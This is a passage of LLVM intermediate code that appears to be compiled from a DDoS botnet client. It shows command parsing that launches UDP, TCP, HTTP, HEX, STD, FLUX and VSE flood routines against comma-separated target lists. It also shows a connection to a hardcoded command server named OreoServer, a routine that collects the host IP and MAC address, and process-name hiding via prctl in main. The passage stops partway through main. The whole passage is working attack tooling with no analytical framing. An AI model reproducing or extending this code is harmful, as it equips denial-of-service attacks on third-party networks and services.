  %57 = load i8*, i8** %56, align 8
  %58 = tail call i32 @atoi(i8* %57) #14
  br label %.thread212

.thread212:                                       ; preds = %46, %38, %50, %55
  %59 = phi i32 [ %53, %55 ], [ %53, %50 ], [ 1000000, %46 ], [ 1000000, %38 ]
  %60 = phi i32 [ %49, %55 ], [ %49, %50 ], [ %49, %46 ], [ 1000, %38 ]
  %61 = phi i32 [ %58, %55 ], [ 0, %50 ], [ 0, %46 ], [ 0, %38 ]
  %strchr = tail call i8* @strchr(i8* %40, i32 44)
  %62 = icmp eq i8* %strchr, null
  br i1 %62, label %69, label %.preheader.preheader

.preheader.preheader:                             ; preds = %.thread212
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %65
  %.sink = phi i8* [ null, %65 ], [ %40, %.preheader.preheader ]
  %63 = tail call i8* @strtok(i8* %.sink, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i64 0, i64 0)) #3
  %64 = icmp eq i8* %63, null
  br i1 %64, label %.loopexit.loopexit, label %65

; <label>:65:                                     ; preds = %.preheader
  %66 = tail call i32 @listFork()
  %67 = icmp eq i32 %66, 0
  br i1 %67, label %68, label %.preheader

; <label>:68:                                     ; preds = %65
  tail call void @sendUDP(i8* nonnull %63, i32 %41, i32 %42, i32 %43, i32 %44, i32 %60, i32 %59, i32 %61)
  tail call void @_exit(i32 0) #16
  unreachable

; <label>:69:                                     ; preds = %.thread212
  %70 = tail call i32 @listFork()
  %71 = icmp eq i32 %70, 0
  br i1 %71, label %72, label %.loopexit

; <label>:72:                                     ; preds = %69
  tail call void @sendUDP(i8* %40, i32 %41, i32 %42, i32 %43, i32 %44, i32 %60, i32 %59, i32 %61)
  tail call void @_exit(i32 0) #16
  unreachable

; <label>:73:                                     ; preds = %2
  %74 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.102, i64 0, i64 0)) #14
  %75 = icmp eq i32 %74, 0
  br i1 %75, label %76, label %139

; <label>:76:                                     ; preds = %73
  %77 = icmp slt i32 %0, 6
  br i1 %77, label %.loopexit, label %78

; <label>:78:                                     ; preds = %76
  %79 = getelementptr inbounds i8*, i8** %1, i64 3
  %80 = load i8*, i8** %79, align 8
  %81 = tail call i32 @atoi(i8* %80) #14
  %82 = icmp eq i32 %81, -1
  br i1 %82, label %.loopexit, label %83

; <label>:83:                                     ; preds = %78
  %84 = getelementptr inbounds i8*, i8** %1, i64 2
  %85 = load i8*, i8** %84, align 8
  %86 = tail call i32 @atoi(i8* %85) #14
  %87 = icmp eq i32 %86, -1
  br i1 %87, label %.loopexit, label %88

; <label>:88:                                     ; preds = %83
  %89 = getelementptr inbounds i8*, i8** %1, i64 4
  %90 = load i8*, i8** %89, align 8
  %91 = tail call i32 @atoi(i8* %90) #14
  %92 = icmp eq i32 %91, -1
  %93 = icmp sgt i32 %91, 32
  %or.cond203 = or i1 %92, %93
  br i1 %or.cond203, label %.loopexit, label %94

; <label>:94:                                     ; preds = %88
  %95 = icmp sgt i32 %0, 6
  br i1 %95, label %96, label %.thread213

; <label>:96:                                     ; preds = %94
  %97 = getelementptr inbounds i8*, i8** %1, i64 6
  %98 = load i8*, i8** %97, align 8
  %99 = tail call i32 @atoi(i8* %98) #14
  %100 = icmp slt i32 %99, 0
  br i1 %100, label %.loopexit, label %101

; <label>:101:                                    ; preds = %96
  %102 = icmp eq i32 %0, 8
  br i1 %102, label %103, label %.thread213

; <label>:103:                                    ; preds = %101
  %104 = getelementptr inbounds i8*, i8** %1, i64 7
  %105 = load i8*, i8** %104, align 8
  %106 = tail call i32 @atoi(i8* %105) #14
  %107 = icmp slt i32 %106, 1
  br i1 %107, label %.loopexit, label %.thread213

.thread213:                                       ; preds = %94, %103, %101
  %108 = phi i1 [ true, %103 ], [ false, %101 ], [ false, %94 ]
  %109 = getelementptr inbounds i8*, i8** %1, i64 1
  %110 = load i8*, i8** %109, align 8
  %111 = tail call i32 @atoi(i8* %85) #14
  %112 = tail call i32 @atoi(i8* %80) #14
  %113 = tail call i32 @atoi(i8* %90) #14
  %114 = getelementptr inbounds i8*, i8** %1, i64 5
  %115 = load i8*, i8** %114, align 8
  br i1 %108, label %116, label %120

; <label>:116:                                    ; preds = %.thread213
  %117 = getelementptr inbounds i8*, i8** %1, i64 7
  %118 = load i8*, i8** %117, align 8
  %119 = tail call i32 @atoi(i8* %118) #14
  br label %120

; <label>:120:                                    ; preds = %.thread213, %116
  %121 = phi i32 [ %119, %116 ], [ 10, %.thread213 ]
  br i1 %95, label %122, label %126

; <label>:122:                                    ; preds = %120
  %123 = getelementptr inbounds i8*, i8** %1, i64 6
  %124 = load i8*, i8** %123, align 8
  %125 = tail call i32 @atoi(i8* %124) #14
  br label %126

; <label>:126:                                    ; preds = %120, %122
  %127 = phi i32 [ %125, %122 ], [ 0, %120 ]
  %strchr196 = tail call i8* @strchr(i8* %110, i32 44)
  %128 = icmp eq i8* %strchr196, null
  br i1 %128, label %135, label %.preheader218.preheader

.preheader218.preheader:                          ; preds = %126
  br label %.preheader218

.preheader218:                                    ; preds = %.preheader218.preheader, %131
  %.sink204 = phi i8* [ null, %131 ], [ %110, %.preheader218.preheader ]
  %129 = tail call i8* @strtok(i8* %.sink204, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i64 0, i64 0)) #3
  %130 = icmp eq i8* %129, null
  br i1 %130, label %.loopexit.loopexit260, label %131

; <label>:131:                                    ; preds = %.preheader218
  %132 = tail call i32 @listFork()
  %133 = icmp eq i32 %132, 0
  br i1 %133, label %134, label %.preheader218

; <label>:134:                                    ; preds = %131
  tail call void @sendTCP(i8* nonnull %129, i32 %111, i32 %112, i32 %113, i8* %115, i32 %127, i32 %121)
  tail call void @_exit(i32 0) #16
  unreachable

; <label>:135:                                    ; preds = %126
  %136 = tail call i32 @listFork()
  %137 = icmp eq i32 %136, 0
  br i1 %137, label %138, label %.loopexit

; <label>:138:                                    ; preds = %135
  tail call void @sendTCP(i8* %110, i32 %111, i32 %112, i32 %113, i8* %115, i32 %127, i32 %121)
  tail call void @_exit(i32 0) #16
  unreachable

; <label>:139:                                    ; preds = %73
  %140 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.103, i64 0, i64 0)) #14
  %141 = icmp eq i32 %140, 0
  br i1 %141, label %142, label %164

; <label>:142:                                    ; preds = %139
  %143 = icmp slt i32 %0, 4
  br i1 %143, label %.loopexit, label %144

; <label>:144:                                    ; preds = %142
  %145 = getelementptr inbounds i8*, i8** %1, i64 2
  %146 = load i8*, i8** %145, align 8
  %147 = tail call i32 @atoi(i8* %146) #14
  %148 = icmp slt i32 %147, 1
  br i1 %148, label %.loopexit, label %149

; <label>:149:                                    ; preds = %144
  %150 = getelementptr inbounds i8*, i8** %1, i64 3
  %151 = load i8*, i8** %150, align 8
  %152 = tail call i32 @atoi(i8* %151) #14
  %153 = icmp slt i32 %152, 1
  br i1 %153, label %.loopexit, label %154

; <label>:154:                                    ; preds = %149
  %155 = getelementptr inbounds i8*, i8** %1, i64 1
  %156 = load i8*, i8** %155, align 8
  %strchr197 = tail call i8* @strchr(i8* %156, i32 44)
  %157 = icmp eq i8* %strchr197, null
  br i1 %157, label %163, label %.preheader220

.preheader220:                                    ; preds = %154
  %158 = tail call i8* @strtok(i8* %156, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i64 0, i64 0)) #3
  %159 = icmp eq i8* %158, null
  br i1 %159, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader220
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %160 = phi i8* [ %161, %.lr.ph ], [ %158, %.lr.ph.preheader ]
  tail call void @sendHTTP(i8* nonnull %160, i32 %147, i32 %152)
  %161 = tail call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i64 0, i64 0)) #3
  %162 = icmp eq i8* %161, null
  br i1 %162, label %.loopexit.loopexit261, label %.lr.ph

; <label>:163:                                    ; preds = %154
  tail call void @sendHTTP(i8* %156, i32 %147, i32 %152)
  br label %.loopexit

; <label>:164:                                    ; preds = %139
  %165 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.104, i64 0, i64 0)) #14
  %166 = icmp eq i32 %165, 0
  br i1 %166, label %167, label %195

; <label>:167:                                    ; preds = %164
  %168 = icmp slt i32 %0, 6
  br i1 %168, label %.loopexit, label %169

; <label>:169:                                    ; preds = %167
  %170 = getelementptr inbounds i8*, i8** %1, i64 3
  %171 = load i8*, i8** %170, align 8
  %172 = tail call i32 @atoi(i8* %171) #14
  %173 = icmp slt i32 %172, 1
  br i1 %173, label %.loopexit, label %174

; <label>:174:                                    ; preds = %169
  %175 = getelementptr inbounds i8*, i8** %1, i64 5
  %176 = load i8*, i8** %175, align 8
  %177 = tail call i32 @atoi(i8* %176) #14
  %178 = icmp slt i32 %177, 1
  br i1 %178, label %.loopexit, label %179

; <label>:179:                                    ; preds = %174
  %180 = tail call i32 @listFork()
  %181 = icmp eq i32 %180, 0
  br i1 %181, label %182, label %.loopexit

; <label>:182:                                    ; preds = %179
  %183 = getelementptr inbounds i8*, i8** %1, i64 1
  %184 = load i8*, i8** %183, align 8
  %185 = getelementptr inbounds i8*, i8** %1, i64 2
  %186 = load i8*, i8** %185, align 8
  %187 = load i8*, i8** %170, align 8
  %188 = tail call i32 @atoi(i8* %187) #14
  %189 = trunc i32 %188 to i16
  %190 = load i8*, i8** %175, align 8
  %191 = tail call i32 @atoi(i8* %190) #14
  %192 = getelementptr inbounds i8*, i8** %1, i64 6
  %193 = load i8*, i8** %192, align 8
  %194 = tail call i32 @atoi(i8* %193) #14
  tail call void @sendHEX(i8* %184, i8* %186, i16 zeroext %189, i8* undef, i32 %191, i32 %194)
  tail call void @exit(i32 0) #16
  unreachable

; <label>:195:                                    ; preds = %164
  %196 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.105, i64 0, i64 0)) #14
  %197 = icmp eq i32 %196, 0
  br i1 %197, label %198, label %219

; <label>:198:                                    ; preds = %195
  %199 = icmp slt i32 %0, 4
  br i1 %199, label %.loopexit, label %200

; <label>:200:                                    ; preds = %198
  %201 = getelementptr inbounds i8*, i8** %1, i64 2
  %202 = load i8*, i8** %201, align 8
  %203 = tail call i32 @atoi(i8* %202) #14
  %204 = icmp slt i32 %203, 1
  br i1 %204, label %.loopexit, label %205

; <label>:205:                                    ; preds = %200
  %206 = getelementptr inbounds i8*, i8** %1, i64 3
  %207 = load i8*, i8** %206, align 8
  %208 = tail call i32 @atoi(i8* %207) #14
  %209 = icmp slt i32 %208, 1
  br i1 %209, label %.loopexit, label %210

; <label>:210:                                    ; preds = %205
  %211 = getelementptr inbounds i8*, i8** %1, i64 1
  %212 = load i8*, i8** %211, align 8
  %strchr198 = tail call i8* @strchr(i8* %212, i32 44)
  %213 = icmp eq i8* %strchr198, null
  br i1 %213, label %218, label %214

; <label>:214:                                    ; preds = %210
  %215 = tail call i8* @strtok(i8* %212, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i64 0, i64 0)) #3
  %216 = icmp eq i8* %215, null
  br i1 %216, label %.loopexit, label %217

; <label>:217:                                    ; preds = %214
  tail call void @sendSTD(i8* nonnull %215, i32 %203, i32 %208)
  unreachable

; <label>:218:                                    ; preds = %210
  tail call void @sendSTD(i8* %212, i32 %203, i32 %208)
  unreachable

; <label>:219:                                    ; preds = %195
  %220 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.106, i64 0, i64 0)) #14
  %221 = icmp eq i32 %220, 0
  br i1 %221, label %222, label %.loopexit227

; <label>:222:                                    ; preds = %219
  %223 = icmp slt i32 %0, 6
  br i1 %223, label %.loopexit, label %224

; <label>:224:                                    ; preds = %222
  %225 = getelementptr inbounds i8*, i8** %1, i64 1
  %226 = load i8*, i8** %225, align 8
  %227 = getelementptr inbounds i8*, i8** %1, i64 2
  %228 = load i8*, i8** %227, align 8
  %229 = tail call i32 @atoi(i8* %228) #14
  %230 = getelementptr inbounds i8*, i8** %1, i64 3
  %231 = load i8*, i8** %230, align 8
  %232 = tail call i32 @atoi(i8* %231) #14
  %233 = getelementptr inbounds i8*, i8** %1, i64 4
  %234 = load i8*, i8** %233, align 8
  %235 = tail call i32 @atoi(i8* %234) #14
  %236 = icmp eq i32 %0, 7
  br i1 %236, label %237, label %241

; <label>:237:                                    ; preds = %224
  %238 = getelementptr inbounds i8*, i8** %1, i64 6
  %239 = load i8*, i8** %238, align 8
  %240 = tail call i32 @atoi(i8* %239) #14
  br label %241

; <label>:241:                                    ; preds = %224, %237
  %242 = phi i32 [ %240, %237 ], [ 10, %224 ]
  %243 = getelementptr inbounds i8*, i8** %1, i64 5
  %244 = load i8*, i8** %243, align 8
  %245 = tail call i32 @atoi(i8* %244) #14
  %strchr199 = tail call i8* @strchr(i8* %226, i32 44)
  %246 = icmp eq i8* %strchr199, null
  br i1 %246, label %253, label %.preheader226.preheader

.preheader226.preheader:                          ; preds = %241
  br label %.preheader226

.preheader226:                                    ; preds = %.preheader226.preheader, %249
  %.sink207 = phi i8* [ null, %249 ], [ %226, %.preheader226.preheader ]
  %247 = tail call i8* @strtok(i8* %.sink207, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i64 0, i64 0)) #3
  %248 = icmp eq i8* %247, null
  br i1 %248, label %.loopexit227.loopexit, label %249

; <label>:249:                                    ; preds = %.preheader226
  %250 = tail call i32 @listFork()
  %251 = icmp eq i32 %250, 0
  br i1 %251, label %252, label %.preheader226

; <label>:252:                                    ; preds = %249
  tail call void @sendFLUX(i8* nonnull %247, i32 %229, i32 %232, i32 %235, i32 %245, i32 %242)
  tail call void @_exit(i32 0) #16
  unreachable

; <label>:253:                                    ; preds = %241
  %254 = tail call i32 @listFork()
  %255 = icmp eq i32 %254, 0
  br i1 %255, label %256, label %.loopexit

; <label>:256:                                    ; preds = %253
  tail call void @sendFLUX(i8* %226, i32 %229, i32 %232, i32 %235, i32 %245, i32 %242)
  tail call void @_exit(i32 0) #16
  unreachable

.loopexit227.loopexit:                            ; preds = %.preheader226
  %.pre = load i8*, i8** %1, align 8
  br label %.loopexit227

.loopexit227:                                     ; preds = %.loopexit227.loopexit, %219
  %257 = phi i8* [ %.pre, %.loopexit227.loopexit ], [ %3, %219 ]
  %258 = tail call i32 @strcmp(i8* %257, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.107, i64 0, i64 0)) #14
  %259 = icmp eq i32 %258, 0
  br i1 %259, label %260, label %327

; <label>:260:                                    ; preds = %.loopexit227
  %261 = icmp slt i32 %0, 6
  br i1 %261, label %.loopexit, label %262

; <label>:262:                                    ; preds = %260
  %263 = getelementptr inbounds i8*, i8** %1, i64 3
  %264 = load i8*, i8** %263, align 8
  %265 = tail call i32 @atoi(i8* %264) #14
  %266 = icmp eq i32 %265, -1
  br i1 %266, label %.loopexit, label %267

; <label>:267:                                    ; preds = %262
  %268 = getelementptr inbounds i8*, i8** %1, i64 2
  %269 = load i8*, i8** %268, align 8
  %270 = tail call i32 @atoi(i8* %269) #14
  %271 = icmp eq i32 %270, -1
  br i1 %271, label %.loopexit, label %272

; <label>:272:                                    ; preds = %267
  %273 = getelementptr inbounds i8*, i8** %1, i64 4
  %274 = load i8*, i8** %273, align 8
  %275 = tail call i32 @atoi(i8* %274) #14
  %276 = icmp eq i32 %275, -1
  br i1 %276, label %.loopexit, label %277

; <label>:277:                                    ; preds = %272
  %278 = getelementptr inbounds i8*, i8** %1, i64 5
  %279 = load i8*, i8** %278, align 8
  %280 = tail call i32 @atoi(i8* %279) #14
  %281 = icmp eq i32 %280, -1
  %282 = icmp sgt i32 %280, 65500
  %283 = or i1 %282, %281
  %284 = icmp sgt i32 %275, 32
  %or.cond210 = or i1 %284, %283
  br i1 %or.cond210, label %.loopexit, label %285

; <label>:285:                                    ; preds = %277
  %286 = icmp eq i32 %0, 7
  br i1 %286, label %287, label %292

; <label>:287:                                    ; preds = %285
  %288 = getelementptr inbounds i8*, i8** %1, i64 6
  %289 = load i8*, i8** %288, align 8
  %290 = tail call i32 @atoi(i8* %289) #14
  %291 = icmp slt i32 %290, 1
  br i1 %291, label %.loopexit, label %292

; <label>:292:                                    ; preds = %287, %285
  %293 = getelementptr inbounds i8*, i8** %1, i64 1
  %294 = load i8*, i8** %293, align 8
  %295 = tail call i32 @atoi(i8* %269) #14
  %296 = tail call i32 @atoi(i8* %264) #14
  %297 = tail call i32 @atoi(i8* %274) #14
  %298 = tail call i32 @atoi(i8* %279) #14
  %299 = icmp sgt i32 %0, 6
  br i1 %299, label %300, label %.thread217

; <label>:300:                                    ; preds = %292
  %301 = getelementptr inbounds i8*, i8** %1, i64 6
  %302 = load i8*, i8** %301, align 8
  %303 = tail call i32 @atoi(i8* %302) #14
  br i1 %286, label %.thread217, label %304

; <label>:304:                                    ; preds = %300
  %305 = getelementptr inbounds i8*, i8** %1, i64 7
  %306 = load i8*, i8** %305, align 8
  %307 = tail call i32 @atoi(i8* %306) #14
  %308 = icmp sgt i32 %0, 8
  br i1 %308, label %309, label %.thread217

; <label>:309:                                    ; preds = %304
  %310 = getelementptr inbounds i8*, i8** %1, i64 8
  %311 = load i8*, i8** %310, align 8
  %312 = tail call i32 @atoi(i8* %311) #14
  br label %.thread217

.thread217:                                       ; preds = %300, %292, %304, %309
  %313 = phi i32 [ %307, %309 ], [ %307, %304 ], [ 1000000, %300 ], [ 1000000, %292 ]
  %314 = phi i32 [ %303, %309 ], [ %303, %304 ], [ %303, %300 ], [ 1000, %292 ]
  %315 = phi i32 [ %312, %309 ], [ 0, %304 ], [ 0, %300 ], [ 0, %292 ]
  %strchr200 = tail call i8* @strchr(i8* %294, i32 44)
  %316 = icmp eq i8* %strchr200, null
  br i1 %316, label %323, label %.preheader222.preheader

.preheader222.preheader:                          ; preds = %.thread217
  br label %.preheader222

.preheader222:                                    ; preds = %.preheader222.preheader, %319
  %.sink211 = phi i8* [ null, %319 ], [ %294, %.preheader222.preheader ]
  %317 = tail call i8* @strtok(i8* %.sink211, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i64 0, i64 0)) #3
  %318 = icmp eq i8* %317, null
  br i1 %318, label %.loopexit.loopexit262, label %319

; <label>:319:                                    ; preds = %.preheader222
  %320 = tail call i32 @listFork()
  %321 = icmp eq i32 %320, 0
  br i1 %321, label %322, label %.preheader222

; <label>:322:                                    ; preds = %319
  tail call void @sendVSE(i8* nonnull %317, i32 %295, i32 %296, i32 %297, i32 %298, i32 %314, i32 %313, i32 %315)
  tail call void @_exit(i32 0) #16
  unreachable

; <label>:323:                                    ; preds = %.thread217
  %324 = tail call i32 @listFork()
  %325 = icmp eq i32 %324, 0
  br i1 %325, label %326, label %.loopexit

; <label>:326:                                    ; preds = %323
  tail call void @sendVSE(i8* %294, i32 %295, i32 %296, i32 %297, i32 %298, i32 %314, i32 %313, i32 %315)
  tail call void @_exit(i32 0) #16
  unreachable

; <label>:327:                                    ; preds = %.loopexit227
  %328 = tail call i32 @strcmp(i8* %257, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.108, i64 0, i64 0)) #14
  %329 = icmp eq i32 %328, 0
  %330 = load i64, i64* @numpids, align 8
  %331 = icmp ne i64 %330, 0
  %or.cond = and i1 %329, %331
  br i1 %or.cond, label %.lr.ph234.preheader, label %.loopexit

.lr.ph234.preheader:                              ; preds = %327
  br label %.lr.ph234

.lr.ph234:                                        ; preds = %.lr.ph234.preheader, %344
  %.0233 = phi i64 [ %345, %344 ], [ 0, %.lr.ph234.preheader ]
  %332 = load i32*, i32** @pids, align 8
  %333 = getelementptr inbounds i32, i32* %332, i64 %.0233
  %334 = load i32, i32* %333, align 4
  %335 = icmp eq i32 %334, 0
  br i1 %335, label %344, label %336

; <label>:336:                                    ; preds = %.lr.ph234
  %337 = tail call i32 @getpid() #3
  %338 = icmp eq i32 %334, %337
  br i1 %338, label %344, label %339

; <label>:339:                                    ; preds = %336
  %340 = load i32*, i32** @pids, align 8
  %341 = getelementptr inbounds i32, i32* %340, i64 %.0233
  %342 = load i32, i32* %341, align 4
  %343 = tail call i32 @kill(i32 %342, i32 9) #3
  br label %344

; <label>:344:                                    ; preds = %336, %.lr.ph234, %339
  %345 = add i64 %.0233, 1
  %346 = load i64, i64* @numpids, align 8
  %347 = icmp ult i64 %345, %346
  br i1 %347, label %.lr.ph234, label %.loopexit.loopexit263

.loopexit.loopexit:                               ; preds = %.preheader
  br label %.loopexit

.loopexit.loopexit260:                            ; preds = %.preheader218
  br label %.loopexit

.loopexit.loopexit261:                            ; preds = %.lr.ph
  br label %.loopexit

.loopexit.loopexit262:                            ; preds = %.preheader222
  br label %.loopexit

.loopexit.loopexit263:                            ; preds = %344
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit263, %.loopexit.loopexit262, %.loopexit.loopexit261, %.loopexit.loopexit260, %.loopexit.loopexit, %.preheader220, %327, %323, %253, %214, %179, %135, %69, %260, %262, %267, %272, %277, %287, %222, %198, %200, %205, %167, %169, %174, %163, %142, %144, %149, %76, %78, %83, %88, %96, %103, %6, %8, %13, %18, %23, %33
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @atoi(i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @getpid() local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @kill(i32, i32) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() local_unnamed_addr #1 {
  %1 = alloca [512 x i8], align 16
  %2 = getelementptr inbounds [512 x i8], [512 x i8]* %1, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %2, i8 0, i64 512, i32 16, i1 false)
  %3 = load i32, i32* @mainCommSock, align 4
  %4 = icmp eq i32 %3, 0
  br i1 %4, label %7, label %5

; <label>:5:                                      ; preds = %0
  %6 = tail call i32 @close(i32 %3) #3
  store i32 0, i32* @mainCommSock, align 4
  br label %7

; <label>:7:                                      ; preds = %0, %5
  %8 = load i32, i32* @currentServer, align 4
  %9 = add nsw i32 %8, 1
  %10 = icmp eq i32 %8, 0
  %.sink = select i1 %10, i32 0, i32 %9
  store i32 %.sink, i32* @currentServer, align 4
  %11 = sext i32 %.sink to i64
  %12 = getelementptr inbounds [1 x i8*], [1 x i8*]* @OreoServer, i64 0, i64 %11
  %13 = load i8*, i8** %12, align 8
  %14 = call i8* @strcpy(i8* nonnull %2, i8* %13) #3
  %15 = call i8* @strchr(i8* nonnull %2, i32 58) #14
  %16 = icmp eq i8* %15, null
  br i1 %16, label %20, label %17

; <label>:17:                                     ; preds = %7
  %18 = getelementptr inbounds i8, i8* %15, i64 1
  %19 = call i32 @atoi(i8* %18) #14
  store i8 0, i8* %15, align 1
  br label %20

; <label>:20:                                     ; preds = %7, %17
  %.0 = phi i32 [ %19, %17 ], [ 49182, %7 ]
  %21 = call i32 @socket(i32 2, i32 1, i32 0) #3
  store i32 %21, i32* @mainCommSock, align 4
  %22 = call i32 @connectTimeout(i32 %21, i8* nonnull %2, i32 %.0, i32 30)
  %23 = icmp eq i32 %22, 0
  %. = zext i1 %23 to i32
  ret i32 %.
}

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() local_unnamed_addr #1 {
  %1 = alloca %struct.sockaddr_in, align 4
  %2 = alloca %struct.sockaddr_in, align 4
  %3 = alloca i32, align 4
  %4 = alloca [4096 x i8], align 16
  %5 = alloca %struct.ifreq, align 8
  %6 = tail call i32 @socket(i32 2, i32 2, i32 0) #3
  %7 = icmp eq i32 %6, -1
  br i1 %7, label %46, label %8

; <label>:8:                                      ; preds = %0
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 3, i64 0
  %10 = bitcast i8* %9 to i64*
  store i64 0, i64* %10, align 4
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 0
  store i16 2, i16* %11, align 4
  %12 = tail call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.109, i64 0, i64 0)) #3
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 2, i32 0
  store i32 %12, i32* %13, align 4
  %14 = tail call zeroext i16 @htons(i16 zeroext 53) #17
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 1
  store i16 %14, i16* %15, align 2
  %16 = bitcast %struct.sockaddr_in* %1 to %struct.sockaddr*
  %17 = call i32 @connect(i32 %6, %struct.sockaddr* nonnull %16, i32 16) #3
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %46, label %19

; <label>:19:                                     ; preds = %8
  store i32 16, i32* %3, align 4
  %20 = bitcast %struct.sockaddr_in* %2 to %struct.sockaddr*
  %21 = call i32 @getsockname(i32 %6, %struct.sockaddr* nonnull %20, i32* nonnull %3) #3
  %22 = icmp eq i32 %21, -1
  br i1 %22, label %46, label %23

; <label>:23:                                     ; preds = %19
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 2, i32 0
  %25 = load i32, i32* %24, align 4
  store i32 %25, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %26 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.110, i64 0, i64 0), i32 0) #3
  %27 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 0
  %28 = call i8* @fdgets(i8* nonnull %27, i32 4096, i32 %26)
  %29 = icmp eq i8* %28, null
  br i1 %29, label %.loopexit17, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %23
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %36
  %30 = call i8* @strstr(i8* nonnull %27, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.111, i64 0, i64 0)) #14
  %31 = icmp eq i8* %30, null
  br i1 %31, label %36, label %.preheader.preheader

.preheader.preheader:                             ; preds = %.lr.ph
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %.preheader
  %.015 = phi i8* [ %34, %.preheader ], [ %27, %.preheader.preheader ]
  %32 = load i8, i8* %.015, align 1
  %33 = icmp eq i8 %32, 9
  %34 = getelementptr inbounds i8, i8* %.015, i64 1
  br i1 %33, label %35, label %.preheader

; <label>:35:                                     ; preds = %.preheader
  store i8 0, i8* %.015, align 1
  br label %.loopexit17

; <label>:36:                                     ; preds = %.lr.ph
  call void @llvm.memset.p0i8.i64(i8* nonnull %27, i8 0, i64 4096, i32 16, i1 false)
  %37 = call i8* @fdgets(i8* nonnull %27, i32 4096, i32 %26)
  %38 = icmp eq i8* %37, null
  br i1 %38, label %.loopexit17.loopexit, label %.lr.ph

.loopexit17.loopexit:                             ; preds = %36
  br label %.loopexit17

.loopexit17:                                      ; preds = %.loopexit17.loopexit, %23, %35
  %39 = call i32 @close(i32 %26) #3
  %40 = load i8, i8* %27, align 16
  %41 = icmp eq i8 %40, 0
  br i1 %41, label %.loopexit, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %.loopexit17
  %42 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %5, i64 0, i32 0, i32 0, i64 0
  %43 = call i8* @strcpy(i8* nonnull %42, i8* nonnull %27) #3
  %44 = call i32 (i32, i64, ...) @ioctl(i32 %6, i64 35111, %struct.ifreq* nonnull %5) #3
  %scevgep = getelementptr inbounds %struct.ifreq, %struct.ifreq* %5, i64 0, i32 1, i32 0, i32 0
  %scevgep20 = bitcast i64* %scevgep to i8*
  %uglygep = getelementptr inbounds i8, i8* %scevgep20, i64 2
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 0), i8* %uglygep, i64 6, i32 1, i1 false)
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.loopexit17
  %45 = call i32 @close(i32 %6) #3
  br label %46

; <label>:46:                                     ; preds = %19, %8, %0, %.loopexit
  ret i32 0
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8** nocapture) local_unnamed_addr #1 {
  %3 = alloca i32, align 4
  %4 = alloca [4096 x i8], align 16
  %5 = alloca [10 x i8*], align 16
  %6 = load i8*, i8** %1, align 8
  %7 = tail call i64 @strlen(i8* %6) #14
  tail call void @llvm.memset.p0i8.i64(i8* %6, i8 0, i64 %7, i32 1, i1 false)
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.80, i64 0, i64 0), i8** %1, align 8
  %8 = tail call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 ptrtoint ([1 x i8]* @.str.80 to i64), i32 0, i32 0, i32 0) #3
  %9 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %10 = tail call i32 @getpid() #3
  %11 = xor i32 %10, %9
  tail call void @srand(i32 %11) #3
